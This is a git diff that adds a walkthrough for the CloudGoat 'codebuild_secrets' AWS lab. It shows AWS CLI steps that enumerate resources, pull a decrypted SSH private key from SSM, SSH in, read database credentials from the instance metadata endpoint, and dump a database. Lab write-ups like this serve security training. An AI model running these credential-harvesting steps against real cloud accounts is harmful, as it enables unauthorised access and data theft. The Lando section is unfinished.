@@ -443,6 +443,57 @@ This appears to be a bash_history file with credentials in it
  Alternative walthroughs involve downloading awscli from the aws system after sshing in.
  
 ## codebuild_secrets
+**Scenario Goal: Obtain a Pair of Secret Strings Stored in a Secure RDS Database**
 1. Create scenario  
 `./cloudgoat.py create codebuild_secrets --profile goat`  
+2. Document all Outputs information  
+3. Create a profile for solo    
+`aws configure --profile solo`
+4. Access RDS database instance information
+`aws rds describe-db-instances --profile solo`   
+Access Denied
+5. List EC2 instances    
+`aws ec2 describe-instances --profile solo`   
+6. Obtain codebuild information    
+`aws codebuild list-projects --profile solo`
+7. Obtain more information concerning the project listed   
+`aws codebuild batch-get-projects --names <project-name> --profile solo`   
+Hello Calrission Credentials!  
+Find out what else solo can do before moving on and solving this again as Lando   
+8. Since codebuilds are in use, perhaps some automation is as well. Attempt to list ssm parameters  
+`aws ssm describe-parameters --profile solo`
+9. Access the private key parameter     
+`aws ssm get-parameter --name <private-key> --profile solo`   
+Copying this value will result in an invalid ssh key format  
+10. Access the private key paramater without the newline characters
+`aws ssm get-parameter --name <private-key> --with-decryption --query Parameter.Value --profile solo --output text`
+11. Copy the private key value and paste it into a new file
+`vim ssh_key`    
+12. Adjust key permissions in order to use it for ssh
+`chmod 400 ssh_key`
+11. SSH into the described instance
+`ssh -i ssh_key ubuntu@<instanceIP>1`
+12. Access the metadata from the AWS system    
+`curl http://169.254.169.254/latest/user-data`  
+DB Credentials Obtained!
+13. Access the database    
+`psql postgresql://<usr>:<pass>@<rds-instance>:5432/<db_name>`
+14. View the tables    
+`/dt`    
+15. Obtain the secrets    
+`select * from <table_name>;`
 
+**Goal Achieved as Solo**
+
+### Solve codebuild_secrets as Lando Calrission
+1. Configure AWS CLI profile for Lando    
+`aws configure --profile lando` 
+2. Access RDS database instance information
+`aws rds describe-db-instances --profile lando`
+The DB instance appears to not be publically accessible since that value is false  
+3. Attempt to snapshot the database
+`aws rds create-db-snapshot --db-instance-identifier <DBinstanceID> --db-snapshot-identifier cloudgoat --profile lando`  
+4. Modify the instance
+
+### Remove all data for Han & Lando
+1. 
